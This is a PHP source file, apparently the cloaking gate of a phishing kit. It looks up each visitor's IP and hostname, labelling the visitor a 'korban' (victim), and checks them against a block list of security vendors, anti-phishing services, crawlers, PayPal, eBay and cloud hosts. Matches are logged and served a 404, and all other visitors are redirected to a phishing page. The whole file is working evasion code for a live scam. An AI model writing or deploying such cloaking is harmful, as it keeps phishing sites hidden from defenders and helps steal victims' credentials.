<?php

$blocked_words = array(
'amazon',
'aruba',
'above',
'google',
'tor',
'softlayer',
'amazonaws',
'cyveillance',
'phishtank',
'dreamhost',
'netpilot',
'calyxinstitute',
'tor-exit', 
'msnbot',
'p3pwgdsn',
'netcraft',
'194.72.238',
'69.164.111.198',
'banff',
'auchroisk',
'trendmicro',
'ebay',
'paypal',
'torservers',
'comodo',
'crawl',
'sucuri.net',
'crawler',
'proxy',
'enom',
'cloudflare',
'yahoo',
'trustwave', 
'rima-tde.net', 
'tfbnw.net', 
'pacbell.net', 
'tpnet.pl', 
'ovh.net', 
'centralnic', 
'badware',
'phishing',
'antivirus',
'SiteAdvisor',
'McAfee',
'Bitdefender',
'barracuda',
'anti',
'mail',
'phis',
'tester',
'bit',
'security',
'secure',
'52.168.72.225',
'cloud',
'162.243.187.126',
'46.101.94.163',
'46.101.119.24'
);

include './M3tri-hash-bots/anti0.php';
    include './M3tri-hash-bots/anti1.php';
    include './M3tri-hash-bots/anti2.php';
    include './M3tri-hash-bots/anti3.php';
    include './M3tri-hash-bots/anti4.php';
    include './M3tri-hash-bots/anti5.php';
    include './M3tri-hash-bots/anti6.php';
    include './M3tri-hash-bots/anti7.php';
    include './M3tri-hash-bots/anti8.php';
    include './M3tri-hash-bots/anti9.php';
    

$today = getdate();
$date = ''.$today['weekday'].' - '.$today['mday'].' '.$today['month'].' '.$today['year'].' - '.$today['hours'].':'.$today['minutes'].':'.$today['seconds'].'';


function inStr($s, $as){
    $s = strtoupper($s);
    if(!is_array($as)) $as=array($as);
    for($i=0;$i<count($as);$i++) if(strpos(($s),strtoupper($as[$i]))!==false) return true;
    return false;
}

$host_korban = ''.$_SERVER['REMOTE_ADDR'].' - '.gethostbyaddr($_SERVER['REMOTE_ADDR']).'';

if(inStr($host_korban, $blocked_words)){
    $file = fopen("data-.txt","a");
    fwrite($file, $date." : ".$_SERVER['REMOTE_ADDR']." - ".gethostbyaddr($_SERVER['REMOTE_ADDR'])."\n");
    fclose($file);
    header("HTTP/1.0 404 Not Found");
    die();
}else{
    $file = fopen("data.txt","a");
    fwrite($file, $date." : ".$_SERVER['REMOTE_ADDR']." - ".gethostbyaddr($_SERVER['REMOTE_ADDR'])."\n");
    fclose($file);
    header("Location: ./index2.php?pwd=bnp");
}

?>